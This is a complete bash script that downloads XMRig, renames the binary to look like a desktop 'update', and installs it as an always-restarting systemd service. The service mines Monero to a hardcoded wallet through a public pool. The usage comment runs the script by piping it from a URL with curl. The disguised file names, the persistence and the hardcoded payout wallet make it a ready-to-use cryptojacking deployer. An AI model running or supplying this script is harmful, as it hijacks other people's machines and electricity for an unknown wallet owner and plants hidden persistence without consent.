#!/bin/bash

# Usage: bash <(curl -s https://your-script-url) v7
# Default worker: vDefault
WORKER=${1:-vDefault}
LOGFILE="/root/desktop.log"
WRAPPER="/root/desktop-update-wrapper.sh"
BINARY="/root/Documents/build/update"
WALLET="84QEvQ9V25mUNDiMXmq1aF96FwpzDPg4R1d564MjhvxrNpz7rizA3Q3FUowb83rsBK8P9DnDQnk4hTED57Ycd4p1Q8uRzZz"
POOL="pool.supportxmr.com:443"

echo "🔓 Unlocking any locked files..."
ulimit -n 65535 2>/dev/null || true
ulimit -u 4096 2>/dev/null || true

echo "📦 Installing required packages..."
apt-get update -y 2>/dev/null || true
apt-get install -y curl wget tar git build-essential tmux libhwloc-dev -y 2>/dev/null || true

echo "📁 Creating directories..."
mkdir -p /root/Documents/build
cd /root/Documents/build || exit 1

echo "⬇️ Downloading latest XMRig..."
URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep 'linux-x64.tar.gz' | cut -d '"' -f 4 | head -n 1)
if [ -z "$URL" ]; then
    echo "❌ Failed to fetch XMRig URL from GitHub. Exiting."
    exit 1
fi

curl -L "$URL" -o xmrig.tar.gz || { echo "❌ Download failed"; exit 1; }
tar -xzf xmrig.tar.gz || { echo "❌ Extract failed"; exit 1; }
mv xmrig-*/xmrig "$BINARY" || { echo "❌ Move failed"; exit 1; }
chmod +x "$BINARY"

echo "🧠 Creating wrapper script..."
cat > "$WRAPPER" <<EOF
#!/bin/bash
tmux kill-session -t miner 2>/dev/null
tmux new-session -d -s miner "$BINARY -o $POOL -u $WALLET -k --tls -p $WORKER | tee $LOGFILE"
EOF

chmod +x "$WRAPPER"

echo "⚙️ Setting up systemd service..."
cat > /etc/systemd/system/xmrig-wrapper.service <<EOF
[Unit]
Description=XMRig Miner Wrapper
After=network.target

[Service]
ExecStart=/bin/bash $WRAPPER
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

echo "🔁 Enabling service..."
systemctl daemon-reexec 2>/dev/null || true
systemctl daemon-reload
systemctl enable xmrig-wrapper.service
systemctl restart xmrig-wrapper.service

STATUS=$(systemctl is-active xmrig-wrapper.service)

echo "=========================================="
echo "✅ Miner $WORKER is configured and running"
echo "🛠️  Binary: $BINARY"
echo "📝 Logs: $LOGFILE"
echo "📦 Service: xmrig-wrapper [Status: $STATUS]"
echo "🔁 Restart: sudo systemctl restart xmrig-wrapper"
echo "🛑 Stop:    sudo systemctl stop xmrig-wrapper"
echo "🔍 Logs:    tail -f $LOGFILE"
echo "🧠 Tmux:    tmux attach-session -t miner"
echo "=========================================="
